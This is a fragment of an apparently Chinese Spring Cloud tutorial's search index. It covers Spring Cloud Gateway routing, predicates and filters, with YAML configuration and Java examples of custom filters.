PrefixPath\uff0c\u5728\u8bf7\u6c42\u8def\u5f84\u524d\u6dfb\u52a0\u6307\u5b9a\u7684\u524d\u7f00 AddRequestParameter\uff0c\u6dfb\u52a0\u8bf7\u6c42\u53c2\u6570 RemoveRequestParameter\uff0c\u79fb\u9664\u8bf7\u6c42\u53c2\u6570 RewriteRequestParameter\uff0c\u91cd\u5199\u8bf7\u6c42\u53c2\u6570\u7684\u503c \u8bf7\u6c42\u4f53\u548c\u54cd\u5e94\u4f53\u76f8\u5173 ModifyRequestBody\uff0c\u4fee\u6539\u8bf7\u6c42\u4f53\u7684\u5185\u5bb9 CacheRequestBody\uff0c\u7f13\u5b58\u8bf7\u6c42\u4f53 ModifyResponseBody\uff0c\u4fee\u6539\u54cd\u5e94\u4f53\u7684\u5185\u5bb9 RemoveJsonAttributesResponseBody\uff0c\u4ece JSON \u54cd\u5e94\u4f53\u4e2d\u79fb\u9664\u6307\u5b9a\u7684\u5c5e\u6027 JsonToGrpc\uff0c\u5c06 JSON \u683c\u5f0f\u7684\u8bf7\u6c42\u4f53\u8f6c\u6362\u4e3a gRPC \u683c\u5f0f \u6d41\u91cf\u7ba1\u7406\u548c\u5bb9\u9519\u76f8\u5173 CircuitBreaker\uff0c\u5b9e\u73b0\u65ad\u8def\u5668\u529f\u80fd Retry\uff0c\u5728\u8bf7\u6c42\u5931\u8d25\u65f6\u6309\u7167\u6307\u5b9a\u7684\u7b56\u7565\u91cd\u8bd5\u8bf7\u6c42 RequestRateLimiter\uff0c\u5bf9\u8bf7\u6c42\u8fdb\u884c\u901f\u7387\u9650\u5236 RequestSize\uff0c\u9650\u5236\u8bf7\u6c42\u7684\u5927\u5c0f LocalResponseCache\uff0c\u5728\u672c\u5730\u7f13\u5b58\u54cd\u5e94 \u91cd\u5b9a\u5411\u548c\u72b6\u6001\u7801\u76f8\u5173 RedirectTo\uff0c\u5c06\u8bf7\u6c42\u91cd\u5b9a\u5411\u5230\u6307\u5b9a\u7684 URI SetStatus\uff0c\u8bbe\u7f6e\u54cd\u5e94\u72b6\u6001\u7801 \u8ba4\u8bc1\u548c\u4f1a\u8bdd\u7ba1\u7406\u76f8\u5173 TokenRelay\uff0c\u5c06 OAuth 2.0 \u4ee4\u724c\u4ece\u7f51\u5173\u4f20\u9012\u5230\u4e0b\u6e38\u670d\u52a1 SaveSession\uff0c\u4fdd\u5b58\u4f1a\u8bdd\u4fe1\u606f PreserveHostHeader\uff0c\u4fdd\u7559\u539f\u59cb\u8bf7\u6c42\u4e2d\u7684 Host \u5934 \u8981\u6dfb\u52a0 Filter\uff0c\u540c\u6837\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u914d\u7f6e\u6587\u4ef6\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 Bean\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u6dfb\u52a0\u8bf7\u6c42\u5934\u7684 Filter\u3002\u4e0e\u4e4b\u524d Predicate \u91cc\u52a0\u5165\u4e00\u4e2a\u5217\u8868\u4e0d\u540c\uff0cFilter \u9700\u8981\u4f20\u5165\u4e00\u4e2a Map\uff0ckey \u548c value \u4ea4\u66ff\u3002 spring: cloud: gateway: routes: - id: payment-service uri: lb://payment-service predicates: - Path=/** filters: - AddRequestHeader=X-Request-Foo, Bar \u5f53\u7136\uff0c\u53ef\u4ee5\u7528\u5168\u5c55\u5f00\u7684\u65b9\u5f0f\u3002 spring: cloud: gateway: routes: - id: payment-service uri: lb://payment-service predicates: - name: Path args: pattern: /** filters: - name: AddRequestHeader args: headerName: X-Request-Foo headerValue: Bar \u540c\u6837\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 Bean \u6765\u914d\u7f6e\uff0c\u4f46\u662f\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\u3002 \u81ea\u5b9a\u4e49\u5168\u5c40 Filter \u81ea\u5b9a\u4e49 GlobalFilter \u9700\u8981\u5b9e\u73b0 GlobalFilter \u548c Ordered \u63a5\u53e3\uff0c\u524d\u8005\u662f Filter \u7684\u63a5\u53e3\uff0c\u540e\u8005\u5b9a\u4e49\u4e86\u4e00\u4e2a getOrder \u65b9\u6cd5\uff0c\u7528\u4e8e\u5b9a\u4e49 Filter \u7684\u987a\u5e8f\uff0c\u8fd9\u4e2a getOrder \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u503c\u8d8a\u5c0f\uff0cFilter \u7684\u4f18\u5148\u7ea7\u8d8a\u9ad8\u3002 @Component public class CustomFilter implements GlobalFilter, Ordered { @Override public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) { // do something return chain.filter(exchange); } @Override public int getOrder() { return 0; } } \u8fd9\u91cc\u7684 Mono \u662f WebFlux \u7684\u8bed\u6cd5\uff0c\u6211\u4eec\u53ea\u4f1a\u5728\u4e0b\u9762\u7528\u5230\u4e00\u70b9\u70b9\uff0c\u4e0d\u7528\u592a\u62c5\u5fc3\u3002\u5982\u679c\u4f60\u5b66\u8fc7 JavaScript \u7684 Promise\uff0c\u90a3\u4e48 Mono \u5c31\u662f\u7c7b\u4f3c\u7684\u4e1c\u897f\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u7edf\u8ba1\u8bf7\u6c42\u65f6\u95f4\u7684 Filter\uff0c\u53ef\u4ee5\u8fd9\u6837\u5199\uff1a @Component @Slf4j public class RequestTimeFilter implements GlobalFilter, Ordered { @Override public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) { exchange.getAttributes().put(\"requestTimeBegin\", System.currentTimeMillis()); return chain.filter(exchange).then( Mono.fromRunnable(() -> { Long startTime = exchange.getAttribute(\"requestTimeBegin\"); if (startTime != null) { log.info(exchange.getRequest().getURI().getRawPath() + \": \" + (System.currentTimeMillis() - startTime) + \"ms\"); } }) ); } @Override public int getOrder() { return 0; } } \u81ea\u5b9a\u4e49 Gateway Filter Gateway Filter \u7684\u81ea\u5b9a\u4e49\u4e0e Predicate \u7c7b\u4f3c\uff0c\u9700\u8981\u7ee7\u627f AbstractGatewayFilterFactory \u7c7b\u3002 @Component public class CustomGatewayFilterFactory extends AbstractGatewayFilterFactory<CustomGatewayFilterFactory.Config> { @Validated public class Config { // configurations needed for this filter @Data String secret; } @Override public List<String> shortcutFieldOrder() { // return the order of the arguments return Arrays.asList(\"secret\"); } public CustomGatewayFilterFactory() { super(Config.class); } @Override public GatewayFilter apply(Config config) { return new GatewayFilter() { @Override public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) { String secret = exchange.getRequest().getQueryParams().getFirst(\"secret\"); if (secret == null || !secret.equals(config.secret)) { exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED); return exchange.getResponse().setComplete(); } return chain.filter(exchange); } }; } } \u8fd9\u91cc\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u5bc6\u7801\u9a8c\u8bc1 Filter\u3002\u6dfb\u52a0\u4e4b\u540e\uff0c\u5728 yml \u6587\u4ef6\u4e2d\u4f7f\u7528\u65f6\uff0cFull Expanded \u7684\u65b9\u5f0f\u5982\u4e0b\uff1a spring: cloud: gateway: routes: - id: payment-service uri: lb://payment-service predicates: - name: Path args: pattern: /** filters: - name: Custom args: secret: 123 \u800c Shortcut \u7684\u65b9\u5f0f\u5982\u4e0b\uff0c\u5176\u4e2d\u53c2\u6570\u7528\u9017\u53f7\u5206\u9694\uff0c\u987a\u5e8f\u4e0e\u4e0a\u9762\u7684 ShortcutFieldOrder \u8fd4\u56de\u503c\u4e00\u81f4\u3002 spring: cloud: gateway: routes: - id: payment-service uri: lb://payment-service predicates: - Path=/** filters: - Custom=123 \u4e00\u6837\u7684\uff0cCustom \u662f\u7c7b\u540d\u7684\u53bb\u6389 GatewayFilterFactory \u540e\u7684\u90e8\u5206\u3002","title":"Spring Gateway \u7f51\u5173"},{"location":"10/#spring-cloud-ch10-gateway","text":"Spring Cloud Gateway \u662f Spring Cloud \u7684\u4e00\u4e2a\u5168\u65b0\u9879\u76ee\uff0c\u5b83\u65e8\u5728\u4e3a\u5fae\u670d\u52a1\u67b6\u6784\u63d0\u4f9b\u4e00\u79cd\u7b80\u5355\u6709\u6548\u7684\u7edf\u4e00\u7684 API \u8def\u7531\u7ba1\u7406\u65b9\u5f0f\u3002 \u4e0d\u8fc7\u5728\u5b66\u4e60 Gateway \u524d\uff0c\u6211\u4eec\u5148\u6765\u590d\u4e60\u4e00\u4e0b\u8ba1\u7b97\u673a\u7f51\u7edc\u3002","title":"Spring Cloud \u901f\u6210 Ch10 GateWay \u7f51\u5173"},{"location":"10/#_1","text":"\u8ba1\u7b97\u673a\u7f51\u7edc\u6709 OSI \u4e03\u5c42\u6a21\u578b\uff08\u7406\u8bba\u6a21\u578b\uff09\u548c TCP/IP \u56db\u5c42\u6a21\u578b\uff08\u5b9e\u9645\u6a21\u578b\uff09\u3002 OSI \u6a21\u578b\u5305\u62ec\uff08\u81ea\u4e0b\u800c\u4e0a\uff09\uff1a \u7269\u7406\u5c42\uff0c\u5373\u8ba1\u7b97\u673a\u7f51\u7edc\u4f9d\u8d56\u7684\u7269\u7406\u8bbe\u5907\uff0c\u5982\u7f51\u7ebf\u3001\u4ea4\u6362\u673a\u7b49\u3002 \u6570\u636e\u94fe\u8def\u5c42\uff0c\u5373\u8ba1\u7b97\u673a\u7f51\u7edc\u7269\u7406\u8bbe\u5907\u4e4b\u95f4\u8fde\u63a5\u53ca\u5176\u6570\u636e\u4f20\u8f93\u7684\u534f\u8bae\uff0c\u91cd\u8981\u7684\u6982\u5ff5\u6709\u4ee5\u592a\u7f51\u534f\u8bae\uff0cMAC \u5730\u5740\uff0c\u4ea4\u6362\u673a\u7b49\u3002\u8fd9\u4e00\u5c42\u76f8\u6bd4\u4e8e\u7f51\u7edc\u5c42\uff0c\u9700\u8981\u8003\u8651\u7269\u7406\u4e0a\u7684\u9650\u5236\uff0c\u57fa\u4e8e MAC \u5730\u5740\u8fdb\u884c\u6570\u636e\u4f20\u8f93\u3002 \u7f51\u7edc\u5c42\uff0c\u5373\u5728\u6570\u636e\u94fe\u8def\u5c42\u652f\u6301\u4e86\u6570\u636e\u4f20\u8f93\u7684\u57fa\u7840\u4e0a\uff0c\u5982\u4f55\u5728\u591a\u4e2a\u7f51\u7edc\u4e4b\u95f4\u4f20\u8f93\u6570\u636e\uff0c\u91cd\u8981\u7684\u6982\u5ff5\u6709 IP \u5730\u5740\uff0c\u8def\u7531\u5668\u7b49\u3002\u8fd9\u4e00\u5c42\u76f8\u6bd4\u4e8e\u6570\u636e\u94fe\u8def\u5c42\uff0c\u53ea\u8003\u8651\u903b\u8f91\u4e0a\u7684\u7f51\u7edc\u8fde\u63a5\uff0c\u57fa\u4e8e IP \u5730\u5740\u8fdb\u884c\u6570\u636e\u4f20\u8f93\u3002 \u4f20\u8f93\u5c42\uff0c\u5373\u5728\u7f51\u7edc\u5c42\u652f\u6301\u4e86\u6570\u636e\u4f20\u8f93\u7684\u57fa\u7840\u4e0a\uff0c\u5982\u4f55\u5728\u7aef\u5230\u7aef\u7684\u8fde\u63a5\u4e2d\u4f20\u8f93\u6570\u636e\uff0c\u91cd\u8981\u7684\u6982\u5ff5\u6709 TCP \u534f\u8bae\uff0cUDP \u534f\u8bae\u7b49\u3002\u8fd9\u4e00\u5c42\u76f8\u6bd4\u4e8e\u7f51\u7edc\u5c42\uff0c\u53ea\u8003\u8651\u7aef\u5230\u7aef\u7684\u8fde\u63a5\uff0c\u57fa\u4e8e\u7aef\u53e3\u53f7\u8fdb\u884c\u6570\u636e\u4f20\u8f93\u3002 \u4f1a\u8bdd\u5c42\uff0c\u5373\u5728\u4f20\u8f93\u5c42\u652f\u6301\u4e86\u6570\u636e\u4f20\u8f93\u7684\u57fa\u7840\u4e0a\uff0c\u5982\u4f55\u5728\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u5efa\u7acb\u8fde\u63a5\uff0c\u91cd\u8981\u7684\u6982\u5ff5\u6709\u4f1a\u8bdd\u63a7\u5236\uff0c\u4f1a\u8bdd\u540c\u6b65\u7b49\uff0c\u5e38\u7528\u7684\u6280\u672f\u6709 RPC\uff0cRestful \u7b49\u3002 \u8868\u793a\u5c42\uff0c\u5373\u5728\u4f1a\u8bdd\u5c42\u652f\u6301\u4e86\u6570\u636e\u4f20\u8f93\u7684\u57fa\u7840\u4e0a\uff0c\u5982\u4f55\u5728\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u4f20\u8f93\u6570\u636e\uff0c\u91cd\u8981\u7684\u6982\u5ff5\u6709\u6570\u636e\u683c\u5f0f\u8f6c\u6362\uff0c\u6570\u636e\u52a0\u5bc6\u7b49\u3002 \u5e94\u7528\u5c42\uff0c\u5373\u5728\u8868\u793a\u5c42\u652f\u6301\u4e86\u6570\u636e\u4f20\u8f93\u7684\u57fa\u7840\u4e0a\uff0c\u5982\u4f55\u5728\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u4f20\u8f93\u6570\u636e\uff0c\u91cd\u8981\u7684\u6982\u5ff5\u6709 HTTP \u534f\u8bae\uff0cFTP \u534f\u8bae\uff0cDNS \u534f\u8bae\u7b49\u3002 TCP/IP \u6a21\u578b\u5305\u62ec\uff08\u81ea\u4e0b\u800c\u4e0a\uff09\uff1a \u7f51\u7edc\u63a5\u53e3\u5c42\uff0c\u5bf9\u5e94 OSI \u6a21\u578b\u7684\u7269\u7406\u5c42\u548c\u6570\u636e\u94fe\u8def\u5c42\u3002 \u7f51\u9645\u5c42\uff0c\u5bf9\u5e94 OSI \u6a21\u578b\u7684\u7f51\u7edc\u5c42\u3002 \u4f20\u8f93\u5c42\uff0c\u5bf9\u5e94 OSI \u6a21\u578b\u7684\u4f20\u8f93\u5c42\u3002 \u5e94\u7528\u5c42\uff0c\u5bf9\u5e94 OSI \u6a21\u578b\u7684\u4f1a\u8bdd\u5c42\u3001\u8868\u793a\u5c42\u548c\u5e94\u7528\u5c42\u3002 \u5728\u8ba1\u7b97\u673a\u7f51\u7edc\u4e2d\uff0c\u7f51\u5173\u662f\u4e00\u4e2a\u7f51\u7edc\u8282\u70b9\uff0c\u7528\u4e8e\u8fde\u63a5\u4e24\u4e2a\u7f51\u7edc\uff0c\u5b9e\u73b0\u6570\u636e\u7684\u8f6c\u53d1\u3002\u7f51\u5173\u662f OSI \u6a21\u578b\u4e2d\u7684\u7b2c\u4e09\u5c42\u8bbe\u5907\uff0c\u5b83\u53ef\u4ee5\u5b9e\u73b0\u4e0d\u540c\u7f51\u7edc\u4e4b\u95f4\u7684\u6570\u636e\u4f20\u8f93\uff0c\u662f\u7f51\u7edc\u5c42\u7684\u4e00\u4e2a\u8bbe\u5907\u3002 \u4f8b\u5982\uff0c\u6211\u4eec\u7684\u5bb6\u5ead\u7f51\u7edc\u8fde\u63a5\u4e86\u4e92\u8054\u7f51\uff0c\u90a3\u4e48\u5bb6\u5ead\u7f51\u7edc\u7684\u8def\u7531\u5668\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u7f51\u5173\uff0c\u5c06\u5bb6\u5ead\u7f51\u7edc\u548c\u4e92\u8054\u7f51\u8fde\u63a5\u8d77\u6765\u3002\u5bf9\u4e8e\u516c\u53f8\u90e8\u7f72\u597d\u7684\u8f6f\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u7f51\u5173\u90e8\u7f72\u5728\u516c\u53f8\u7684\u670d\u52a1\u5668\u4e0a\uff0c\u5b9e\u73b0\u516c\u53f8\u5185\u90e8\u7f51\u7edc\u548c\u4e92\u8054\u7f51\u4e4b\u95f4\u7684\u6570\u636e\u4f20\u8f93\u3002","title":"\u7f51\u5173"},{"location":"10/#spring-gateway","text":"Spring Gateway \u6709\u4e09\u5927\u6838\u5fc3\u6982\u5ff5\uff1a \u65ad\u8a00\uff08Predicate\uff09\uff1a\u7528\u4e8e\u5339\u914d HTTP \u8bf7\u6c42\u7684\u5c5e\u6027\uff0c\u5982\u8bf7\u6c42\u8def\u5f84\u3001\u8bf7\u6c42\u53c2\u6570\u7b49\u3002\u6ce8\u610f\uff0c\u8fd9\u4e2a\u65ad\u8a00\u548c assert \u5b8c\u5168\u4e0d\u662f\u4e00\u4e2a\u610f\u601d\uff0c\u662f\u7ffb\u8bd1\u7684\u95ee\u9898\u3002Predicate \u6b63\u786e\u7684\u7ffb\u8bd1\u5e94\u8be5\u662f\u8c13\u8bcd\u6216\u8005\u5224\u5b9a\u5668\u3001\u5224\u636e\uff0c\u4e5f\u5c31\u662f\u4e00\u4e9b\u7528\u6765\u5224\u65ad\u67d0\u7269\u662f\u5426\u7b26\u5408\u67d0\u6761\u4ef6\u7684\u51fd\u6570\u3002 \u8fc7\u6ee4\u5668\uff08Filter\uff09\uff1a\u7528\u4e8e\u4fee\u6539 HTTP \u8bf7\u6c42\u548c\u54cd\u5e94\u7684\u5c5e\u6027\uff0c\u5982\u8bf7\u6c42\u5934\u3001\u8bf7\u6c42\u4f53\u7b49\u3002\u53ef\u4ee5\u52a0\u5728\u65ad\u8a00\u4e4b\u524d\u6216\u4e4b\u540e\u3002 \u8def\u7531\uff08Route\uff09\uff1a\u7528\u4e8e\u5c06\u65ad\u8a00\u548c\u8fc7\u6ee4\u5668\u7ec4\u5408\u5728\u4e00\u8d77\uff0c\u5b9e\u73b0\u8bf7\u6c42\u7684\u8f6c\u53d1\u3002 \u5728\u63a5\u53d7\u5230\u8bf7\u6c42\u540e\uff0c\u9996\u5148\u68c0\u67e5\u8def\u7531\uff0c\u628a\u8bf7\u6c42\u53d1\u9001\u5230\u5bf9\u5e94\u7684\u8def\u7531\u4e0a\u3002\u7136\u540e\uff0c\u68c0\u67e5\u65ad\u8a00\uff0c\u5982\u679c\u65ad\u8a00\u5339\u914d\uff0c\u5219\u6267\u884c\u8fc7\u6ee4\u5668\uff0c\u4fee\u6539\u8bf7\u6c42\u548c\u54cd\u5e94\u3002\u6700\u540e\uff0c\u5c06\u8bf7\u6c42\u53d1\u9001\u5230\u76ee\u6807\u670d\u52a1\u3002 \u5982\u679c\u7528\u7c7b\u4f3c\u4ee3\u7801\u7684\u65b9\u5f0f\u6765\u63cf\u8ff0\uff0c\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u4f2a\u4ee3\u7801\uff1a void gatewayHandleRequest(Request request) { for (Route route : routes) { boolean match = true; for (Predicate predicate : route.getPredicates()) { match &= predicate.test(request); } if (!match) continue; for (Filter filter : route.getFilters()) { filter.filter(request); } route.forward(request); return; } }","title":"Spring Gateway \u4e09\u5927\u6838\u5fc3\u6982\u5ff5"},{"location":"10/#gateway","text":"Gateway \u672c\u8eab\u4e5f\u662f\u4e00\u4e2a\u5fae\u670d\u52a1\uff0c\u8981\u6ce8\u518c\u5230\u6ce8\u518c\u4e2d\u5fc3\u4e2d\u3002 \u56e0\u6b64\u6211\u4eec\u521b\u5efa\u4e00\u4e2a Spring \u5b50\u9879\u76ee\uff0c\u8981\u5305\u62ec\u4e4b\u524d Consul \u7684\u4f9d\u8d56\uff0c\u4ee5\u53ca Gateway \u7684\u4f9d\u8d56\u3002 dependencies { implementation 'org.springframework.boot:spring-boot-starter-actuator' implementation 'org.springframework.cloud:spring-cloud-starter-consul-discovery' implementation 'org.springframework.cloud:spring-cloud-starter-bootstrap' implementation 'org.springframework.cloud:spring-cloud-starter-consul-config' implementation 'org.springframework.cloud:spring-cloud-starter-gateway:4.1.5' } \u56e0\u4e3a\u4f7f\u7528\u7684 spring boot \u7248\u672c\uff0c\u56e0\u6b64\u76f4\u63a5\u542f\u52a8\u9879\u76ee\u5373\u53ef\u5728 Consul \u6ce8\u518c\u7f51\u5173\u3002 \u6211\u4eec\u628a\u7f51\u5173\u6539\u5230 9527 \u7aef\u53e3\u3002","title":"\u521b\u5efa Gateway"},{"location":"10/#_2","text":"\u5bf9\u4e8e\u7b80\u5355\u7684\u8def\u7531\u6620\u5c04\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u914d\u7f6e\u6587\u4ef6\u6765\u5b9e\u73b0\u3002 spring: cloud: gateway: routes: - id: payment-service uri: lb://payment-service predicates: - Path=/** \u8fd9\u91cc\u7684 uri \u53ef\u4ee5\u76f4\u63a5\u5199 http \u5730\u5740\u3002\u4f46\u662f\u5982\u679c\u5199 lb:// \uff0c\u5219\u8868\u793a load balanced\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4f7f\u7528\u670d\u52a1\u540d\u6765\u8bbf\u95ee\u670d\u52a1\u3002 id \u662f\u4efb\u610f\u7684\uff0c\u4f46\u662f\u8981\u552f\u4e00\u3002\u8fd9\u91cc\u7684 predicates \u662f\u8def\u7531\u8f6c\u53d1\u7684\u6761\u4ef6\uff0c\u8fd9\u91cc\u8868\u793a\u6240\u6709\u7684\u8bf7\u6c42\u90fd\u8f6c\u53d1\u5230 payment-service \u670d\u52a1\u3002 \u8fd9\u6837\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u7f51\u5173\u8bbf\u95ee payment \u670d\u52a1\u4e86\uff0c\u4f8b\u5982 localhost:9527/payment \u3002 \u5982\u679c\u9700\u8981\u8ba9\u5176\u5b83\u7684\u670d\u52a1\u4e5f\u8fc7\u7f51\u5173\uff0c\u4fee\u6539\u5b83\u4eec\u8c03\u7528\u7684 URI \u5373\u53ef\uff0c\u5373\u4e0b\u9762\u8fd9\u6837 // @HttpExchange(\"http://payment-service/payment\") @HttpExchange(\"http://gateway-service/payment\") \u6211\u4eec\u53ef\u4ee5\u5728 ZipKin \u4e2d\u770b\u5230\uff0c\u73b0\u5728 order \u8bf7\u6c42\u5148\u7ecf\u8fc7\u4e86\u7f51\u5173\uff0c\u7f51\u5173\u518d\u8f6c\u53d1\u5230 payment \u670d\u52a1\u3002","title":"\u57fa\u4e8e\u914d\u7f6e\u6587\u4ef6\u8fdb\u884c\u8def\u7531\u6620\u5c04"},{"location":"10/#bean","text":"\u9664\u4e86\u914d\u7f6e\u6587\u4ef6\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528 Bean \u6765\u914d\u7f6e\u8def\u7531\u3002 @Configuration public class GatewayConfig { @Bean public RouteLocator customRouteLocator(RouteLocatorBuilder builder) { return builder.routes() .route(\"payment-service\", r -> r.path(\"/payment/**\") .uri(\"lb://payment-service\")) .build(); } }","title":"\u57fa\u4e8e Bean \u8fdb\u884c\u8def\u7531\u6620\u5c04"},{"location":"10/#predicate","text":"Predicate \u662f\u7528\u6765\u5339\u914d\u8bf7\u6c42\u7684\u6761\u4ef6\uff0c\u53ef\u4ee5\u6839\u636e\u8bf7\u6c42\u7684\u8def\u5f84\u3001\u8bf7\u6c42\u7684\u53c2\u6570\u7b49\u6765\u5339\u914d\u3002\u4e4b\u524d\u6211\u4eec\u53ea\u7528\u4e86 Path \u65ad\u8a00\uff0c\u8fd8\u6709\u5f88\u591a\u5176\u5b83\u7684\u65ad\u8a00\uff0c\u5177\u4f53\u53ef\u53c2\u8003 \u5b98\u65b9\u6587\u6863 \uff0c\u5176\u5b83 Predicate \u7684\u5199\u6cd5\u90fd\u8981\u53c2\u8003\u6587\u6863\u3002 \u5185\u5efa\u7684 Predicate \u6709\uff1a After\uff0c\u8bf7\u6c42\u65f6\u95f4\u5728\u67d0\u4e2a\u65f6\u95f4\u4e4b\u540e Before\uff0c\u8bf7\u6c42\u65f6\u95f4\u5728\u67d0\u4e2a\u65f6\u95f4\u4e4b\u524d Between\uff0c\u8bf7\u6c42\u65f6\u95f4\u5728\u4e24\u4e2a\u65f6\u95f4\u4e4b\u95f4 Cookie\uff0c\u8bf7\u6c42\u4e2d\u5305\u542b\u67d0\u4e2a Cookie Header\uff0c\u8bf7\u6c42\u5934\u4e2d\u5305\u542b\u67d0\u4e2a\u503c Host\uff0c\u8bf7\u6c42\u7684 Host \u5339\u914d Method\uff0c\u8bf7\u6c42\u7684\u65b9\u6cd5\u5339\u914d Path\uff0c\u8bf7\u6c42\u7684\u8def\u5f84\u5339\u914d Query\uff0c\u8bf7\u6c42\u7684\u53c2\u6570\u5339\u914d RemoteAddr\uff0c\u8bf7\u6c42\u7684 IP \u5730\u5740\u5339\u914d Predicate \u914d\u7f6e\u65b9\u5f0f\u6709\u4e24\u79cd\uff0c\u4e00\u79cd\u53eb Shortcut\uff0c\u5373\u7b80\u5316\u7684\u914d\u7f6e\u65b9\u5f0f\uff0c\u53e6\u4e00\u79cd\u53eb Full Expanded\uff0c\u5373\u5b8c\u5168\u5c55\u5f00\u7684\u914d\u7f6e\u65b9\u5f0f\u3002 \u8fd9\u79cd\u914d\u7f6e\u65b9\u5f0f\u662f Shortcut\uff0c\u5373\u7b80\u5316\u7684\u914d\u7f6e\u65b9\u5f0f\u3002 spring: cloud: gateway: routes: - id: payment-service uri: lb://payment-service predicates: - Path=/** - Query=** \u8fd9\u79cd\u914d\u7f6e\u65b9\u5f0f\u662f Full Expanded\uff0c\u5373\u5b8c\u5168\u5c55\u5f00\u7684\u914d\u7f6e\u65b9\u5f0f\u3002 spring: cloud: gateway: routes: - id: payment-service uri: lb://payment-service predicates: - name: Path args: pattern: /** \u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 Bean \u6765\u914d\u7f6e\uff0c\u4f46\u662f\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\u3002","title":"Predicate"},{"location":"10/#predicate_1","text":"\u6240\u6709\u7684 Predicate \u90fd\u9700\u8981\u4e00\u4e2a RoutePredicateFactory \u5de5\u5382\u6765\u4ea7\u751f\u3002\u9700\u8981\u81ea\u5b9a\u4e49 Predicate \u65f6\uff0c\u9700\u8981\u7ee7\u627f AbstractRoutePredicateFactory \u7c7b\u3002 \u6ce8\u610f\uff0c\u7c7b\u540d\u5e94\u5f53\u4ee5 RoutePredicateFactory \u7ed3\u5c3e\uff0c\u56e0\u4e3a Gateway \u4f1a\u81ea\u52a8\u626b\u63cf\u8fd9\u4e9b\u7c7b\u3002 @Validated \u6ce8\u89e3\u662f Spring \u7684\u6ce8\u89e3\uff0c\u7528\u4e8e\u6821\u9a8c\u914d\u7f6e\u662f\u5426\u6b63\u786e\u3002ServerWebExchange \u7c7b\u4f3c\u4e8e HttpServletRequest\uff0c\u7528\u4e8e\u83b7\u53d6\u8bf7\u6c42\u7684\u4fe1\u606f\u3002 @Component public class CustomPredicateFactory extends AbstractRoutePredicateFactory<CustomPredicateFactory.Config> { @Validated public class CustomConfig { // configurations needed for this predicate @Data String secret; } public CustomPredicateFactory() { super(Config.class); } @Override public List<String> shortcutFieldOrder() { // return the order of the arguments return Arrays.asList(\"secret\"); } @Override public Predicate<ServerWebExchange> apply(Config config) { // return a Predicate return new Predicate<ServerWebExchange>() { @Override public boolean test(ServerWebExchange exchange) { // test the exchange String secret = exchange.getRequest().getQueryParams().getFirst(\"secret\"); return secret != null && secret.equals(config.secret); } }; } } \u6dfb\u52a0\u4e4b\u540e\uff0c\u5728 yml \u6587\u4ef6\u4e2d\u4f7f\u7528\u65f6\uff0cFull Expanded \u7684\u65b9\u5f0f\u5982\u4e0b\uff1a spring: cloud: gateway: routes: - id: payment-service uri: lb://payment-service predicates: - name: Custom args: secret: 123 \u800c Shortcut \u7684\u65b9\u5f0f\u5982\u4e0b\uff0c\u5176\u4e2d\u53c2\u6570\u7528\u9017\u53f7\u5206\u9694\uff0c\u987a\u5e8f\u4e0e\u4e0a\u9762\u7684 ShortcutFieldOrder \u8fd4\u56de\u503c\u4e00\u81f4\u3002 spring: cloud: gateway: routes: - id: payment-service uri: lb://payment-service predicates: - Custom=123 Predicate \u7684\u540d\u5b57 Custom\uff0c\u8fd9\u662f\u7c7b\u540d\u7684\u53bb\u6389 PredicateFactory \u540e\u7684\u90e8\u5206\u3002","title":"\u81ea\u5b9a\u4e49 Predicate"},{"location":"10/#filter","text":"Spring Gateway \u4e2d Filter \u6709\u4e24\u79cd\uff0c\u4e00\u79cd\u662f Global Filter\uff0c\u4e00\u79cd\u662f Gateway Filter\u3002\u524d\u8005\u4f5c\u7528\u4e8e\u6240\u6709\u7684\u8def\u7531\uff0c\u540e\u8005\u4f5c\u7528\u4e8e\u5355\u4e2a\u8def\u7531\u3002\u4f46\u662f\uff0c\u524d\u8005\u6211\u4eec\u4e00\u822c\u4e0d\u9700\u8981\u53bb\u52a8\u5b83\u4eec\u7684\u9ed8\u8ba4\u914d\u7f6e\u3002 Gateway Filter \u7528\u4e8e\u4fee\u6539\u8bf7\u6c42\u548c\u54cd\u5e94\uff0c\u4f8b\u5982\u6dfb\u52a0\u8bf7\u6c42\u5934\u3001\u4fee\u6539\u8bf7\u6c42\u4f53\u7b49\u3002\u5168\u90e8\u5199\u6cd5\u5177\u4f53\u6709\u5f88\u591a\uff0c\u5177\u4f53\u53ef\u53c2\u8003 \u5b98\u65b9\u6587\u6863 \u3002 \u5185\u5efa\u7684 Filter \u6709\uff1a \u8bf7\u6c42\u5934\u76f8\u5173 AddRequestHeader\uff0c\u6dfb\u52a0\u8bf7\u6c42\u5934 AddRequestHeaderIfNotPresent\uff0c\u5982\u679c\u8bf7\u6c42\u5934\u4e0d\u5b58\u5728\uff0c\u5219\u6dfb\u52a0\u8bf7\u6c42\u5934 SetRequestHeader\uff0c\u8bbe\u7f6e\u8bf7\u6c42\u5934 SetRequestHostHeader\uff0c\u8bbe\u7f6e\u8bf7\u6c42\u7684 Host \u5934 RemoveRequestHeader\uff0c\u79fb\u9664\u8bf7\u6c42\u5934 